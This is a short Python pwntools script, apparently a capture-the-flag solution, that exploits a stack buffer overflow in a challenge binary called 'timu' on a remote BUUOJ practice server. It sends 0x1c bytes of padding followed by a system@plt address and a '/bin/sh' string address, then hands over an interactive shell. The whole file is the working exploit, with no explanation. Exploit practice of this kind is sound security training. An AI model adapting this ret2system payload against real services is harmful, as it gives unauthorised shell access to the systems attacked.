from pwn import *

#sh=process("./timu")
sh=remote("node5.buuoj.cn",28647)
elf=ELF("./timu")

main=0x0804859E
binsh=0x08048670
system_plt=0x08048529
payload=0x1c*b'a'+p32(system_plt)+p32(binsh)
sh.sendline(payload)
sh.interactive()
